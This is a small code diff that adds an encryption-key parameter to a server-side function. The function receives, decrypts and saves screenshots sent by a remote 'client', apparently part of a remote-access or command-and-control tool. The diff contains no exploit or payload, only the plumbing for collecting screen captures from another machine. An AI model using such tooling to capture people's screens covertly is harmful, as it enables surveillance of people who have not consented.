@@ -12,7 +12,7 @@ from components.networking import (
 from components.ingestor import createfile_nocollision
 from components.logging import log_activity
 
-def screenshot_command(client_output: bytes, conn_obj: 'socket.socket') -> str:
+def screenshot_command(client_output: bytes, conn_obj: "socket.socket", key: bytes) -> str:
     """Receive, decrypt and store a screenshot from the client."""
 
     random_image_filename = createfile_nocollision("screenshot_data", ".png")
@@ -33,7 +33,7 @@ def screenshot_command(client_output: bytes, conn_obj: 'socket.socket') -> str:
             received_data = reliable_recieve(conn_obj, data_size)
 
             # Decyrpt data
-            decrypted_data = process_and_check_recieved_data(received_data, data_size)
+            decrypted_data = process_and_check_recieved_data(received_data, data_size, key)
             if "Failed" in decrypted_data:
                 print(f"[!] An error has occured! {decrypted_data}")
                 break
